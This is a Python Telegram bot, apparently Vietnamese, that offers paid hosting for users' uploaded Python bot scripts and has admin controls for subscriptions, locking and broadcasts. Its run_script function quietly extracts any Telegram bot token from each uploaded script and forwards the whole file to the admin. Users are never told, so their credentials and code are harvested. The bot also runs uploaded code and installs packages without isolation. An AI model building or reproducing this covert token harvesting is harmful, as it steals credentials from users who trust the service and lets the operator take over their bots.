import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import time
from datetime import datetime, timedelta
from telebot import types
import psutil
import sqlite3

# Configuration
ADMIN_ID = 6379209139
ADMIN_USERNAME = "HgAnh7"
TOKEN = os.getenv("TELEGRAM_TOKEN")
UPLOAD_DIR = 'uploaded_bots'

# Bot instance
bot = telebot.TeleBot(TOKEN)

# Global variables
bot_scripts = {}
user_subscriptions = {}
user_files = {}
active_users = set()
bot_locked = False
free_mode = False

# Ensure upload directory exists
os.makedirs(UPLOAD_DIR, exist_ok=True)

# Database functions
def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_files (user_id INTEGER, file_name TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS active_users (user_id INTEGER PRIMARY KEY)''')
    conn.commit()
    conn.close()

def load_data():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    # Load subscriptions
    c.execute('SELECT * FROM subscriptions')
    for user_id, expiry in c.fetchall():
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    # Load user files
    c.execute('SELECT * FROM user_files')
    for user_id, file_name in c.fetchall():
        user_files.setdefault(user_id, []).append(file_name)
    
    # Load active users
    c.execute('SELECT user_id FROM active_users')
    for user_id, in c.fetchall():
        active_users.add(user_id)
    
    conn.close()

def save_data(table, data):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    if table == 'subscription':
        c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', data)
    elif table == 'user_file':
        c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', data)
    elif table == 'active_user':
        c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (data,))
    conn.commit()
    conn.close()

def remove_data(table, user_id, file_name=None):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    if table == 'subscription':
        c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    elif table == 'user_file':
        c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
    elif table == 'active_user':
        c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

# Initialize database and load data
init_db()
load_data()

# Utility functions
def is_authorized(user_id):
    return free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now())

def is_admin(user_id):
    return user_id == ADMIN_ID

def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton('📤 Tải lên tệp', callback_data='upload'),
        types.InlineKeyboardButton('⚡ Tốc độ Bot', callback_data='speed'),
        types.InlineKeyboardButton('📞 Liên hệ admin', url=f'https://t.me/{ADMIN_USERNAME}')
    )
    
    if is_admin(user_id):
        markup.add(
            types.InlineKeyboardButton('💳 Đăng ký', callback_data='subscription'),
            types.InlineKeyboardButton('📊 Thống kê', callback_data='stats')
        )
        markup.add(
            types.InlineKeyboardButton('🔒 Khóa/Mở Bot', callback_data='toggle_lock'),
            types.InlineKeyboardButton('🔓 Free Mode', callback_data='toggle_free'),
            types.InlineKeyboardButton('📢 Broadcast', callback_data='broadcast')
        )
    
    return markup

def get_user_info(user):
    try:
        profile = bot.get_chat(user.id)
        bio = profile.bio or "No bio"
    except:
        bio = "No bio"
    
    try:
        photos = bot.get_user_profile_photos(user.id, limit=1)
        photo_id = photos.photos[0][-1].file_id if photos.photos else None
    except:
        photo_id = None
    
    return bio, photo_id

def notify_admin_new_user(user):
    bio, photo_id = get_user_info(user)
    username = f"@{user.username}" if user.username else "Không có"
    
    msg = (f"🎉 Người dùng mới!\n"
           f"👤 Name: {user.first_name}\n"
           f"📌 Username: {username}\n"
           f"🆔 ID: {user.id}\n"
           f"📝 Bio: {bio}")
    
    try:
        if photo_id:
            bot.send_photo(ADMIN_ID, photo_id, caption=msg)
        else:
            bot.send_message(ADMIN_ID, msg)
    except:
        pass

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            content = f.read()
        match = re.search(r"['\"](\d{9,10}:[\w-]+)['\"]", content)
        return match.group(1) if match else None
    except:
        return None

def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        for child in parent.children(recursive=True):
            child.kill()
        parent.kill()
    except Exception as e:
        print(f"❌ Failed to kill process: {e}")

# Command handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_locked:
        bot.send_message(message.chat.id, "⚠️ Hiện tại bot đang bị khóa. Vui lòng thử lại sau.")
        return
    
    user = message.from_user
    bio, photo_id = get_user_info(user)
    username = f"@{user.username}" if user.username else "Không có"
    
    # Add new user to active users
    if user.id not in active_users:
        active_users.add(user.id)
        save_data('active_user', user.id)
        notify_admin_new_user(user)
    
    welcome_msg = (f"〽️┇Welcome: {user.first_name}\n"
                   f"🆔┇Your ID: {user.id}\n"
                   f"♻️┇Username: {username}\n"
                   f"📰┇Bio: {bio}\n\n"
                   "〽️ I'm a Python file hosting bot 🎗 You can use the buttons below to control ♻️")
    
    if photo_id:
        bot.send_photo(message.chat.id, photo_id, caption=welcome_msg, reply_markup=create_main_menu(user.id))
    else:
        bot.send_message(message.chat.id, welcome_msg, reply_markup=create_main_menu(user.id))

@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là admin.")
        return
    
    try:
        parts = message.text.split()
        user_id, days = int(parts[1]), int(parts[2])
        expiry_date = datetime.now() + timedelta(days=days)
        
        user_subscriptions[user_id] = {'expiry': expiry_date}
        save_data('subscription', (user_id, expiry_date.isoformat()))
        
        bot.send_message(message.chat.id, f"✅ Đã thêm {days} ngày cho người dùng `{user_id}`.", parse_mode="Markdown")
        bot.send_message(user_id, f"🎉 Bạn đã được kích hoạt gói {days} ngày. Bắt đầu sử dụng bot nhé!")
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "⚠️ Sai định dạng. Dùng: `/add_subscription <user_id> <số ngày>`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi: {e}")

@bot.message_handler(commands=['remove_subscription'])
def remove_subscription(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là admin.")
        return
    
    try:
        user_id = int(message.text.split()[1])
        if user_id not in user_subscriptions:
            bot.send_message(message.chat.id, f"⚠️ Người dùng `{user_id}` không có gói nào.", parse_mode="Markdown")
            return
        
        del user_subscriptions[user_id]
        remove_data('subscription', user_id)
        
        bot.send_message(message.chat.id, f"✅ Đã xóa gói của người dùng `{user_id}`.", parse_mode="Markdown")
        bot.send_message(user_id, "⚠️ Gói của bạn đã bị hủy. Bạn không thể tiếp tục sử dụng bot.")
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "⚠️ Sai cú pháp. Dùng: `/remove_subscription <user_id>`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi: {e}")

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    if call.data == 'upload':
        if bot_locked:
            bot.send_message(user_id, f"⚠️ Bot hiện đang bị khóa. Vui lòng liên hệ @{ADMIN_USERNAME}.")
            return
        
        if is_authorized(user_id):
            bot.send_message(user_id, "📄 Gửi file .py hoặc .zip bạn muốn tải lên.")
        else:
            bot.send_message(user_id, f"⚠️ Bạn cần đăng ký để sử dụng. Liên hệ @{ADMIN_USERNAME}.")
    
    elif call.data == 'speed':
        try:
            start_time = time.time()
            response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe', timeout=5)
            latency = f"⚡ Độ trễ: {time.time() - start_time:.2f}s" if response.ok else "⚠️ Lỗi khi kiểm tra"
        except Exception as e:
            latency = f"❌ Lỗi kiểm tra tốc độ: {e}"
        bot.send_message(user_id, latency)
    
    elif call.data == 'stats' and is_admin(user_id):
        total_files = sum(len(files) for files in user_files.values())
        stats_msg = (f"📊 Thống kê bot:\n\n"
                    f"📂 Tổng số file: {total_files}\n"
                    f"👤 Tổng người dùng: {len(user_files)}\n"
                    f"✅ Người dùng hoạt động: {len(active_users)}")
        bot.send_message(user_id, stats_msg)
    
    elif call.data == 'toggle_lock' and is_admin(user_id):
        global bot_locked
        bot_locked = not bot_locked
        status = "🔒 Đã khóa" if bot_locked else "🔓 Đã mở khóa"
        bot.send_message(user_id, f"{status} bot.")
    
    elif call.data == 'toggle_free' and is_admin(user_id):
        global free_mode
        free_mode = not free_mode
        status = "bật" if free_mode else "tắt"
        bot.send_message(user_id, f"🔓 Chế độ miễn phí đã {status}.")
    
    elif call.data == 'broadcast' and is_admin(user_id):
        bot.send_message(user_id, "📝 Gửi nội dung bạn muốn thông báo:")
        bot.register_next_step_handler(call.message, process_broadcast)
    
    elif call.data.startswith('stop_'):
        chat_id = int(call.data.split('_')[1])
        stop_running_bot(chat_id)
    
    elif call.data.startswith('delete_'):
        chat_id = int(call.data.split('_')[1])
        delete_uploaded_file(chat_id)

def process_broadcast(message):
    if not is_admin(message.from_user.id):
        return
    
    success_count = fail_count = 0
    for user_id in active_users:
        try:
            bot.send_message(user_id, message.text)
            success_count += 1
        except:
            fail_count += 1
    
    bot.send_message(message.chat.id, f"📢 Đã gửi thông báo:\n🎉 Thành công: {success_count}\n🤦 Thất bại: {fail_count}")

# File handling
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if bot_locked:
        bot.reply_to(message, f"⚠️ Bot hiện đang bị khóa. Liên hệ @{ADMIN_USERNAME}.")
        return
    
    if not is_authorized(user_id):
        bot.reply_to(message, f"⚠️ Bạn cần đăng ký để sử dụng. Liên hệ @{ADMIN_USERNAME}.")
        return
    
    file = message.document
    file_name = file.file_name
    
    if not file_name.endswith(('.py', '.zip')):
        bot.reply_to(message, "⚠️ Chỉ chấp nhận file Python (.py) hoặc file nén .zip.")
        return
    
    try:
        file_info = bot.get_file(file.file_id)
        file_data = bot.download_file(file_info.file_path)
        
        timestamp = int(time.time())
        safe_file_name = f"{user_id}_{timestamp}_{file_name}"
        
        if file_name.endswith('.zip'):
            process_zip_file(file_data, safe_file_name, user_id, message)
        else:
            process_py_file(file_data, safe_file_name, user_id, message)
        
        # Save to user files
        user_files.setdefault(user_id, []).append(file_name)
        save_data('user_file', (user_id, file_name))
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi xử lý file: {e}")

def process_zip_file(file_data, safe_file_name, user_id, message):
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(temp_dir, safe_file_name)
        with open(zip_path, 'wb') as f:
            f.write(file_data)
        
        extract_path = os.path.join(temp_dir, 'unzipped')
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        
        # Check file count limit
        extracted_files = []
        for root, _, files in os.walk(extract_path):
            extracted_files.extend(files)
        
        if len(extracted_files) > 50:
            bot.reply_to(message, "❌ File zip chứa quá nhiều file. Giới hạn là 50.")
            return
        
        # Create final directory
        final_path = os.path.join(UPLOAD_DIR, f"{safe_file_name.split('.')[0]}")
        os.makedirs(final_path, exist_ok=True)
        
        # Move files
        for root, _, files in os.walk(extract_path):
            for file in files:
                src = os.path.join(root, file)
                dst = os.path.join(final_path, file)
                shutil.move(src, dst)
        
        # Find and run Python files
        py_files = [f for f in os.listdir(final_path) if f.endswith('.py')]
        if py_files:
            run_script(os.path.join(final_path, py_files[0]), message.chat.id, final_path, py_files[0], message)
        else:
            bot.send_message(message.chat.id, "❌ Không tìm thấy file .py trong file nén.")

def process_py_file(file_data, safe_file_name, user_id, message):
    final_path = os.path.join(UPLOAD_DIR, safe_file_name)
    with open(final_path, 'wb') as f:
        f.write(file_data)
    
    run_script(final_path, message.chat.id, final_path, safe_file_name, message)

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        # Install requirements if exists
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 Đang cài requirements...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])
        
        # Run the script
        bot.send_message(chat_id, f"🚀 Đang chạy bot: {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path}
        
        # Notify admin
        username = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
        token = extract_token_from_script(script_path)
        
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                bot_username = bot_info['result']['username']
                caption = f"📤 {username} đã tải lên bot: @{bot_username}"
            except:
                caption = f"📤 {username} đã tải lên bot nhưng không lấy được username"
        else:
            caption = f"📤 {username} đã tải lên file không chứa token."
        
        with open(script_path, 'rb') as f:
            bot.send_document(ADMIN_ID, f, caption=caption)
        
        # Send control buttons
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton(f"🔴 Dừng {file_name}", callback_data=f'stop_{chat_id}_{file_name}'),
            types.InlineKeyboardButton(f"🗑️ Xóa {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
        )
        bot.send_message(chat_id, "🎛️ Điều khiển bot:", reply_markup=markup)
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy bot: {e}")

def stop_running_bot(chat_id):
    if chat_id in bot_scripts and 'process' in bot_scripts[chat_id]:
        kill_process_tree(bot_scripts[chat_id]['process'])
        del bot_scripts[chat_id]
        bot.send_message(chat_id, "🔴 Bot đã dừng.")
    else:
        bot.send_message(chat_id, "⚠️ Không có bot nào đang chạy.")

def delete_uploaded_file(chat_id):
    if chat_id in bot_scripts and 'folder_path' in bot_scripts[chat_id]:
        folder_path = bot_scripts[chat_id]['folder_path']
        
        # Check if it's a single file or directory
        if os.path.isfile(folder_path):
            os.remove(folder_path)
            bot.send_message(chat_id, "🗑️ Đã xóa file bot.")
        elif os.path.isdir(folder_path):
            shutil.rmtree(folder_path)
            bot.send_message(chat_id, "🗑️ Đã xóa thư mục bot.")
        else:
            bot.send_message(chat_id, "⚠️ File không tồn tại.")
        
        if chat_id in bot_scripts:
            del bot_scripts[chat_id]
    else:
        bot.send_message(chat_id, "⚠️ Không có file bot nào để xóa.")

if __name__ == "__main__":
    bot.infinity_polling()